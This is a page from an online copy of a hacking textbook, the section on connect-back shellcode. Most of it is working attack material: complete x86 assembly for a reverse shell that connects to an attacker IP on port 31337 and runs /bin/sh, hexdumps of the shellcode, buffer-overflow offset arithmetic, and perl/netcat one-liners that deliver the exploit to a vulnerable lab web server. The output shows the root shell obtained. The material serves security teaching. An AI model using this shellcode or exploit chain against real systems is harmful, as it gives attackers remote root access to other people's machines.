<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x550 Connect-Back Shellcode</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part126.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part128.htm">Next &gt;</a></p><p class="s30" style="padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark116">0x550 Connect-Back Shellcode</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Port-binding shellcode is easily foiled by firewalls. Most firewalls will block incoming connections, except for certain ports with known services. This limits the user’s exposure and will prevent port-binding shellcode from receiving a connection. Software firewalls are now so common that port-bind shellcode has little chance of actually working in the wild.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">However, firewalls typically do not filter outbound connections, since that would hinder usability. From inside the firewall, a user should be able to access any web page or make any other outbound connections. This means that if the shellcode initiates the outbound connection, most firewalls will allow it.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Instead of waiting for a connection from an attacker, connect-back shell- code initiates a TCP connection back to the attacker’s IP address. Opening a TCP connection only requires a call to <span class="s31">socket() </span>and a call to <span class="s31">connect()</span>. This is very similar to the bind-port shellcode, since the socket call is exactly the same and the <span class="s31">connect() </span>call takes the same type of arguments as <span class="s31">bind()</span>. The following connect-back shellcode was made from the bind-port shellcode with a few modifications (shown in bold).</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">connectback_shell.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_973.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; s = socket(2, 1, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x66  ; socketcall is syscall #102 (0x66). pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">cdq       ; Zero out edx for use as a null DWORD later. xor ebx, ebx   ; ebx is the type of socketcall.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; 1 = SYS_SOCKET = socket()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx      ; Build arg array: { protocol = 0, push BYTE 0x1   ;  (in reverse)   SOCK_STREAM = 1, push BYTE 0x2   ;           AF_INET = 2 }</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ecx, esp   ; ecx = ptr to argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 212%;text-align: left;">int 0x80     ; After syscall, eax has socket file descriptor. xchg esi, eax   ; Save socket FD in esi for later.</p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;text-align: left;">; connect(s, [2, 31337, &lt;IP address&gt;], 16) push BYTE 0x66  ; socketcall (syscall #102)</p><p class="s31" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx      ; ebx = 2 (needed for AF_INET)</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push WORD 0x697a ;  (in reverse order)   PORT = 31337 push WORD bx   ;             AF_INET = 2 mov ecx, esp   ; ecx = server struct pointer</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push BYTE 16   ; argv: { sizeof(server struct) = 16, push ecx     ;     server struct pointer, push esi     ;     socket file descriptor } mov ecx, esp   ; ecx = argument array</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ebx     ; ebx = 3 = SYS_CONNECT = connect()</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; eax = connected socket FD</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; dup2(connected socket, {all three standard I/O file descriptors}) xchg eax, ebx   ; Put socket FD in ebx and 0x00000003 in eax. push BYTE 0x2   ; ecx starts at 2.</p><p class="s31" style="padding-left: 91pt;text-indent: 8pt;text-align: left;">pop ecx dup_loop:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80     ; dup2(c, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">dec ecx     ; Count down to 0.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">jns dup_loop   ; If the sign flag is not set, ecx is not negative.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) mov BYTE al, 11  ; execve syscall #11.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push edx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx via esp. push edx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx      ; push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_974.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">In the shellcode above, the connection IP address is set to 192.168.42.72, which should be the IP address of the attacking machine. This address is stored in the <span class="s31">in_addr </span>structure as <span class="s31">0x482aa8c0</span>, which is the hexadecimal representa- tion of 72, 42, 168, and 192. This is made clear when each number is displayed in hexadecimal:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_975.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p /x 192</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = 0xc0 (gdb) p /x 168</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$2 = 0xa8 (gdb) p /x 42</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">$3 = 0x2a (gdb) p /x 72</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$4 = 0x48</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) p /x 31337</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">$5 = 0x7a69 (gdb)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_976.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">Since these values are stored in network byte order but the <span class="s27">x</span>86 archi- tecture is in little-endian order, the stored DWORD seems to be reversed. This means the DWORD for 192.168.42.72 is <span class="s31">0x482aa8c0</span>. This also applies for the two-byte WORD used for the destination port. When the port number 31337 is printed in hexadecimal using gdb, the byte order is shown in little-endian order. This means the displayed bytes must be reversed, so WORD for 31337 is <span class="s31">0x697a</span>.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The netcat program can also be used to listen for incoming connections with the <span class="s31">-l </span>command-line option. This is used in the output below to listen on port 31337 for the connect-back shellcode. The <span class="s31">ifconfig </span>command ensures the IP address of eth0 is 192.168.42.72 so the shellcode can connect back to it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_977.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up reader@hacking:~/booksrc $ ifconfig eth0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">eth0   Link encap:Ethernet HWaddr 00:01:6C:EB:1D:50</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;line-height: 107%;text-align: left;">inet addr:192.168.42.72 Bcast:192.168.42.255 Mask:255.255.255.0 UP BROADCAST MULTICAST MTU:1500 Metric:1</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;line-height: 107%;text-align: left;">RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;text-align: left;">RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;text-align: left;">Interrupt:16</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nc -v -l -p 31337 listening on [any] 31337 ...</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_978.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Now, let’s try to exploit the tinyweb server program using the connect- back shellcode. From working with this program before, we know that the request buffer is 500 bytes long and is located at <span class="s31">0xbffff5c0 </span>in stack memory. We also know that the return address is found within 40 bytes of the end of the buffer.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_979.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm connectback_shell.s reader@hacking:~/booksrc $ hexdump -C connectback_shell</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.  |</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000010 96 6a 66 58 43 68 c0 a8 2a 48 66 68 7a 69 66 53 |.jfXCh..*HfhzifS|</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000020 89 e1 6a 10 51 56 89 e1 43 cd 80 87 f3 87 ce 49 |..j.QV..C.   I|</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000030 b0 3f cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 |.?..Iy  Rh//shh|</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000040 2f 62 69 6e 89 e3 52 89 e2 53 89 e1 cd 80    |/bin..R..S  |</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0000004e</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ wc -c connectback_shell 78 connectback_shell</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 78 )) 402</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p /x 0xbffff5c0 + 200&quot;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = 0xbffff688 reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_980.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Since the offset from the beginning of the buffer to the return address is 540 bytes, a total of 544 bytes must be written to overwrite the four-byte return address. The return address overwrite also needs to be properly aligned, since</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">the return address uses multiple bytes. To ensure proper alignment, the sum of the NOP sled and shellcode bytes must be divisible by four. In addition, the shellcode itself must stay within the first 500 bytes of the overwrite. These are the bounds of the response buffer, and the memory afterward corresponds to other values on the stack that might be written to before we change the program’s control flow. Staying within these bounds avoids the risk of random overwrites to the shellcode, which inevitably lead to crashes. Repeating the return address 16 times will generate 64 bytes, which can be put at the end of the 544-byte exploit buffer and keeps the shellcode safely within the bounds of the buffer. The remaining bytes at the beginning of the exploit buffer will be the NOP sled. The calculations above show that a 402-byte NOP sled will properly align the 78-byte shellcode and place it safely within the bounds of the buffer. Repeating the desired return address 12 times spaces the final 4 bytes of the exploit buffer perfectly to overwrite the saved return address on the stack. Overwriting the return address with <span class="s31">0xbffff688 </span>should return execution right to the middle of the NOP sled, while avoiding bytes near the beginning of the buffer, which might get mangled. These calculated values will be used in the following exploit, but first the connect-back shell needs some place to connect back to. In the output below, netcat is used to listen for incoming connections on port 31337.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_981.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nc -v -l -p 31337 listening on [any] 31337 ...</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_982.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now, in another terminal, the calculated exploit values can be used to exploit the tinyweb program remotely.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From Another Terminal Window</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_983.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ (perl -e &#39;print &quot;\x90&quot;x402&#39;;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; cat connectback_shell;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">&gt; perl -e &#39;print &quot;\x88\xf6\xff\xbf&quot;x20 . &quot;\r\n&quot;&#39;) | nc -v 127.0.0.1 80 localhost [127.0.0.1] 80 (www) open</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_984.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Back in the original terminal, the shellcode has connected back to the netcat process listening on port 31337. This provides root shell access remotely.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_985.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nc -v -l -p 31337 listening on [any] 31337 ...</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">connect to [192.168.42.72] from hacking.local [192.168.42.72] 34391 whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_986.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The network configuration for this example is slightly confusing because the attack is directed at 127.0.0.1 and the shellcode connects back to 192.168.42.72. Both of these IP addresses route to the same place, but</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">192.168.42.72 is easier to use in shellcode than 127.0.0.1. Since the loopback address contains two null bytes, the address must be built on the stack with</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">multiple instructions. One way to do this is to write the two null bytes to the stack using a zeroed register. The file loopback_shell.s is a modified version of connectback_shell.s that uses the loopback address of 127.0.0.1. The differences are shown in the following output.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_987.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s 21c21,22</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&lt;  push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">---</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt;  push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">&gt;  mov WORD [esp+1], dx ; overwrite the BBBB with 0000 in the previous push reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_988.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">After pushing the value <span class="s31">0x01BBBB7f </span>to the stack, the ESP register will point to the beginning of this DWORD. By writing a two-byte WORD of null bytes at ESP+1, the middle two bytes will be overwritten to form the correct return address.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This additional instruction increases the size of the shellcode by a few bytes, which means the NOP sled also needs to be adjusted for the exploit buffer. These calculations are shown in the output below, and they result in a 397-byte NOP sled. This exploit using the loopback shellcode assumes that the tinyweb program is running and that a netcat process is listening for incoming connections on port 31337.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_989.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm loopback_shell.s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00 00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000010 96 6a 66 58 43 68 7f bb bb 01 66 89 54 24 01 66 |.jfXCh  f.T$.f|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 43 cd 80 |hzifS..j.QV..C..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 0b 52 68 |....I.?..Iy. Rh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000040 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 e2 53 89 |//shh/bin..R..S.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000050  e1 cd 80                      |.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000053</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ wc -c loopback_shell 83 loopback_shell</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 )) 397</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ (perl -e &#39;print &quot;\x90&quot;x397&#39;;cat loopback_shell;perl -e &#39;print &quot;\x88\ xf6\xff\xbf&quot;x16 . &quot;\r\n&quot;&#39;) | nc -v 127.0.0.1 80</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">localhost [127.0.0.1] 80 (www) open</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_990.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">As with the previous exploit, the terminal with netcat listening on port 31337 will receive the rootshell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_991.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ nc -vlp 31337 listening on [any] 31337 ...</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">connect to [127.0.0.1] from localhost [127.0.0.1] 42406 whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_992.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">It almost seems too easy, doesn’t it?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part126.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part128.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
